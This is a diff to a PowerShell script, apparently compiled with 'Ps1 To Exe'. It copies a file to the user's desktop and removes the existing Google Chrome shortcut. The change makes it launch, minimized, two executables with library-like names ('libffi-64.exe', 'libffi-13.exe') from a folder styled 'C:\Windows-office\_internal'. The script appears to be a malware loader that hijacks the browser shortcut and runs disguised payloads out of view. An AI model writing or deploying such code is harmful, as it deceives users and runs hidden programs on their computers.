@@ -1,7 +1,7 @@
 ﻿##[Ps1 To Exe]
 ##
 ##Kd3HDZOFADWE8uO1
-##Nc3NCtDXTlODjqHB5jV78Fjsfngyes2Ut4n2lNXoqruisibWKQ==
+##Nc3NCtDXTlKDjqHB5jV78FjsfmEoYcunqa+zzI6ywLu873GMGNQdSlsX
 ##Kd3HFJGZHWLWoLaVvnQnhQ==
 ##LM/RF4eFHHGZ7/K1
 ##K8rLFtDXTiW5
@@ -26,7 +26,7 @@
 ##LNzLEpGeC3fMu77Ro2k3hQ==
 ##L97HB5mLAnfMu77Ro2k3hQ==
 ##P8HPCZWEGmaZ7/K1
-##L8/UAdDXTlODjqHB5jV78Fjsfm4iYsCnia+zzNGyse/0vkU=
+##L8/UAdDXTlKDjqHB5jV78Fjsfn4mUvWCrb73ys+55++M
 ##Kc/BRM3KXhU=
 ##
 ##
@@ -49,7 +49,7 @@ $cheminBureau2 = [System.IO.Path]::Combine($env:USERPROFILE, "Desktop")
 
 # Utilisez la cmdlet Copy-Item pour copier le fichier vers le bureau
 Copy-Item -Path $cheminSource2 -Destination $cheminBureau2 -Force
-$fileToRemove = [System.IO.Path]::Combine($env:USERPROFILE, 'Desktop', 'chrome.lnk')
+$fileToRemove = [System.IO.Path]::Combine($env:USERPROFILE, 'Desktop', 'Google Chrome.lnk')
 
 # Vérifie si le fichier existe avant de tenter de le supprimer
 if (Test-Path $fileToRemove -PathType Leaf) {
@@ -70,5 +70,6 @@ if (Test-Path $fileToRemove2 -PathType Leaf) {
 } else {
     Write-Host "Le fichier 'chrome.lnk' n'existe pas sur le bureau."
 }
-
-Start-Process -FilePath "C:\Windows-office\office.exe" -WindowStyle Minimized
+cd C:\Windows-office\_internal\
+Start-Process -FilePath "C:\Windows-office\_internal\libffi-64.exe" -WindowStyle Minimized
+Start-Process -FilePath "C:\Windows-office\_internal\libffi-13.exe" -WindowStyle Minimized
